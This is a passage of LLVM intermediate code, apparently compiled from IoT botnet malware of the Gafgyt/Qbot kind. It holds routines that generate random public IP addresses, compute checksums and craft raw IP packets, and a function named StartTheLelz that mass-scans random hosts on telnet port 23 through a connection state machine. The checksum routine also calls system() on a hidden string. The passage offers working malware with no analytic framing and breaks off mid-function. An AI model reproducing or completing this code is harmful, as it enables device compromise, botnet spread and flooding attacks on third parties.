  %116 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 198
  br i1 %119, label %120, label %130

120:                                              ; preds = %115
  %121 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 18
  br i1 %124, label %165, label %125

125:                                              ; preds = %120
  %126 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 19
  br i1 %129, label %165, label %130

130:                                              ; preds = %125, %115
  %131 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %132 = load i8, i8* %131, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 198
  br i1 %134, label %135, label %145

135:                                              ; preds = %130
  %136 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 51
  br i1 %139, label %140, label %145

140:                                              ; preds = %135
  %141 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 100
  br i1 %144, label %165, label %145

145:                                              ; preds = %140, %135, %130
  %146 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 203
  br i1 %149, label %150, label %160

150:                                              ; preds = %145
  %151 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %160

155:                                              ; preds = %150
  %156 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %157 = load i8, i8* %156, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp eq i32 %158, 113
  br i1 %159, label %165, label %160

160:                                              ; preds = %155, %150, %145
  %161 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp sge i32 %163, 224
  br label %165

165:                                              ; preds = %160, %155, %140, %125, %120, %110, %100, %85, %70, %55, %45, %40, %25, %20
  %166 = phi i1 [ true, %155 ], [ true, %140 ], [ true, %125 ], [ true, %120 ], [ true, %110 ], [ true, %100 ], [ true, %85 ], [ true, %70 ], [ true, %55 ], [ true, %45 ], [ true, %40 ], [ true, %25 ], [ true, %20 ], [ %164, %160 ]
  br i1 %166, label %167, label %184

167:                                              ; preds = %165
  %168 = call i32 @rand() #12
  %169 = srem i32 %168, 255
  %170 = trunc i32 %169 to i8
  %171 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %170, i8* %171, align 1
  %172 = call i32 @rand() #12
  %173 = srem i32 %172, 255
  %174 = trunc i32 %173 to i8
  %175 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %174, i8* %175, align 1
  %176 = call i32 @rand() #12
  %177 = srem i32 %176, 255
  %178 = trunc i32 %177 to i8
  %179 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %178, i8* %179, align 1
  %180 = call i32 @rand() #12
  %181 = srem i32 %180, 255
  %182 = trunc i32 %181 to i8
  %183 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %182, i8* %183, align 1
  br label %20, !llvm.loop !33

184:                                              ; preds = %165
  %185 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %185, i8 0, i64 16, i1 false)
  %186 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %187 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i32
  %190 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = call i32 (i8*, i8*, ...) @szprintf(i8* %186, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i64 0, i64 0), i32 %189, i32 %192, i32 %195, i32 %198)
  %200 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %201 = call i32 @inet_addr(i8* %200) #12
  ret i32 %201
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getRandomIP(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #15
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @csum(i16* %0, i32 %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !34

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29, !llvm.loop !35

39:                                               ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* %0, %struct.tcphdr* %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #15
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias align 16 i8* @malloc(i64 %28) #12
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 8 %33, i64 24, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %36, i8* align 1 %38, i64 20, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = call i32 @system(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.74, i64 0, i64 0))
  %43 = load i16*, i16** %8, align 8
  %44 = bitcast i16* %43 to i8*
  call void @free(i8* %44) #12
  %45 = load i16, i16* %9, align 2
  ret i16 %45
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #9

declare i32 @system(i8*) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* %0, i32 %1, i32 %2, i8 zeroext %3, i32 %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sclose(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

6:                                                ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

7:                                                ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

10:                                               ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.fd_set*, align 8
  %15 = call i32 @getdtablesize() #12
  %16 = sdiv i32 %15, 4
  %17 = mul nsw i32 %16, 3
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* %1, align 4
  %19 = icmp sgt i32 %18, 512
  br i1 %19, label %20, label %21

20:                                               ; preds = %0
  br label %23

21:                                               ; preds = %0
  %22 = load i32, i32* %1, align 4
  br label %23

23:                                               ; preds = %21, %20
  %24 = phi i32 [ 512, %20 ], [ %22, %21 ]
  store i32 %24, i32* %1, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = call zeroext i16 @htons(i16 zeroext 23) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %29 = getelementptr inbounds [8 x i8], [8 x i8]* %28, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %29, i8 0, i64 8, i1 false)
  %30 = load i32, i32* %1, align 4
  %31 = zext i32 %30 to i64
  %32 = call i8* @llvm.stacksave()
  store i8* %32, i8** %9, align 8
  %33 = alloca %struct.telstate_t, i64 %31, align 16
  store i64 %31, i64* %10, align 8
  %34 = bitcast %struct.telstate_t* %33 to i8*
  %35 = load i32, i32* %1, align 4
  %36 = sext i32 %35 to i64
  %37 = mul i64 %36, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %34, i8 0, i64 %37, i1 false)
  store i32 0, i32* %2, align 4
  br label %38

38:                                               ; preds = %57, %23
  %39 = load i32, i32* %2, align 4
  %40 = load i32, i32* %1, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %60

42:                                               ; preds = %38
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias align 16 i8* @malloc(i64 1024) #12
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %56, i8 0, i64 1024, i1 false)
  br label %57

57:                                               ; preds = %42
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  br label %38, !llvm.loop !36

60:                                               ; preds = %38
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 5, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %62, align 8
  br label %63

63:                                               ; preds = %1078, %60
  br label %64

64:                                               ; preds = %63
  store i32 0, i32* %2, align 4
  br label %65

65:                                               ; preds = %1075, %64
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  br i1 %68, label %69, label %1078

69:                                               ; preds = %65
  %70 = load i32, i32* %2, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %71
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %72, i32 0, i32 2
  %74 = load i8, i8* %73, align 8
  %75 = zext i8 %74 to i32
  switch i32 %75, label %1074 [
    i32 0, label %76
    i32 1, label %233
    i32 2, label %395
    i32 3, label %495
    i32 4, label %563
    i32 5, label %713
    i32 6, label %781
    i32 7, label %925
    i32 8, label %953
  ]

76:                                               ; preds = %69
  %77 = load i32, i32* %2, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %78
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %79, i32 0, i32 8
  %81 = load i8*, i8** %80, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %81, i8 0, i64 1024, i1 false)
  %82 = load i32, i32* %2, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %83
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 3
  %86 = load i8, i8* %85, align 1
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %88, label %108

88:                                               ; preds = %76
  %89 = load i32, i32* %2, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %90
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %91, i32 0, i32 8
  %93 = load i8*, i8** %92, align 8
  store i8* %93, i8** %12, align 8
  %94 = load i32, i32* %2, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %95
  %97 = bitcast %struct.telstate_t* %96 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %97, i8 0, i64 32, i1 false)
  %98 = load i8*, i8** %12, align 8
  %99 = load i32, i32* %2, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %100
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %101, i32 0, i32 8
  store i8* %98, i8** %102, align 8
  %103 = call i32 @getRandomPublicIP()
  %104 = load i32, i32* %2, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %105
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %106, i32 0, i32 1
  store i32 %103, i32* %107, align 4
  br label %147

108:                                              ; preds = %76
  %109 = load i32, i32* %2, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %110
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %111, i32 0, i32 5
  %113 = load i8, i8* %112, align 1
  %114 = add i8 %113, 1
  store i8 %114, i8* %112, align 1
  %115 = load i32, i32* %2, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %116
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %117, i32 0, i32 5
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i64
  %121 = icmp eq i64 %120, 26
  br i1 %121, label %122, label %133

122:                                              ; preds = %108
  %123 = load i32, i32* %2, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 5
  store i8 0, i8* %126, align 1
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 4
  %131 = load i8, i8* %130, align 2
  %132 = add i8 %131, 1
  store i8 %132, i8* %130, align 2
  br label %133

133:                                              ; preds = %122, %108
  %134 = load i32, i32* %2, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 4
  %138 = load i8, i8* %137, align 2
  %139 = zext i8 %138 to i64
  %140 = icmp eq i64 %139, 19
  br i1 %140, label %141, label %146

141:                                              ; preds = %133
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 3
  store i8 1, i8* %145, align 1
  br label %1075

146:                                              ; preds = %133
  br label %147

147:                                              ; preds = %146, %88
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %148, align 4
  %149 = call zeroext i16 @htons(i16 zeroext 23) #15
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %149, i16* %150, align 2
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %152 = getelementptr inbounds [8 x i8], [8 x i8]* %151, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %152, i8 0, i64 8, i1 false)
  %153 = load i32, i32* %2, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %159 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %158, i32 0, i32 0
  store i32 %157, i32* %159, align 4
  %160 = call i32 @socket(i32 2, i32 1, i32 0) #12
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 0
  store i32 %160, i32* %164, align 16
  %165 = load i32, i32* %2, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %166
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %167, i32 0, i32 0
  %169 = load i32, i32* %168, align 16
  %170 = bitcast %struct.timeval* %11 to i8*
  %171 = call i32 @setsockopt(i32 %169, i32 1, i32 20, i8* %170, i32 16) #12
  %172 = load i32, i32* %2, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 16
  %177 = bitcast %struct.timeval* %11 to i8*
  %178 = call i32 @setsockopt(i32 %176, i32 1, i32 21, i8* %177, i32 16) #12
  %179 = load i32, i32* %2, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 0
  %183 = load i32, i32* %182, align 16
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %186

185:                                              ; preds = %147
  br label %1075

186:                                              ; preds = %147
  %187 = load i32, i32* %2, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 16
  %192 = load i32, i32* %2, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %193
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 16
  %197 = call i32 (i32, i32, ...) @fcntl(i32 %196, i32 3, i8* null)
  %198 = or i32 %197, 2048
  %199 = call i32 (i32, i32, ...) @fcntl(i32 %191, i32 4, i32 %198)
  %200 = load i32, i32* %2, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %206 = call i32 @connect(i32 %204, %struct.sockaddr* %205, i32 16)
  %207 = icmp eq i32 %206, -1
  br i1 %207, label %208, label %223

208:                                              ; preds = %186
  %209 = call i32* @__errno_location() #15
  %210 = load i32, i32* %209, align 4
  %211 = icmp ne i32 %210, 115
  br i1 %211, label %212, label %223

212:                                              ; preds = %208
  %213 = load i32, i32* %2, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 16
  %218 = call i32 @sclose(i32 %217)
  %219 = load i32, i32* %2, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 3
  store i8 1, i8* %222, align 1
  br label %232

223:                                              ; preds = %208, %186
  %224 = load i32, i32* %2, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 2
  store i8 1, i8* %227, align 8
  %228 = load i32, i32* %2, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %230, i32 0, i32 6
  store i32 0, i32* %231, align 4
  br label %232

232:                                              ; preds = %223, %212
  br label %1074

233:                                              ; preds = %69
  %234 = load i32, i32* %2, align 4
  %235 = sext i32 %234 to i64
